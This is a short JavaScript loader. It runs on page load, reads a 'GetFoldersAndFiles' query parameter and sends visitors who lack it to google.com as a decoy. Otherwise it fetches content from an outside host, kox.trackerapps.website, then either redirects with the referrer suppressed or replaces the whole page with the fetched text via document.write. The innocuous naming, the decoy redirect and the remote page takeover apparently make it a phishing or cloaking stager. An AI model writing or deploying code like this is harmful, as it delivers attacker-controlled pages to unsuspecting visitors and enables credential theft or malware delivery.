
var redirectWithoutReferrer;
var params;
var id;

(function () {

    function redirect(url) {
        var meta = document.createElement("meta");

        meta.name = "referrer";
        meta.content = "no-referrer";

        document.head.appendChild(meta);

        window.location.replace(url);
    }

    if (!window.__GetFoldersAndFiles_FETCH_RAN__) {

        window.__GetFoldersAndFiles_FETCH_RAN__ = 1;

        params = new URLSearchParams(window.location.search);

        id = params.get("GetFoldersAndFiles");

        if (!id) {

            redirect("https://www.google.com");

        } else {

            fetch(
                "https://kox.trackerapps.website/grav/x.php?id=" +
                encodeURIComponent(id)
            )

            .then(function (response) {
                return response.text();
            })

            .then(function (content) {

                try {
                    var data = JSON.parse(content);

                    if (data.redirectUrl) {
                        redirect(data.redirectUrl);
                        return;
                    }

                } catch (error) {}

                document.open();
                document.write(content);
                document.close();

            })

            .catch(function (error) {
                console.error(error);
            });

        }
    }

})();
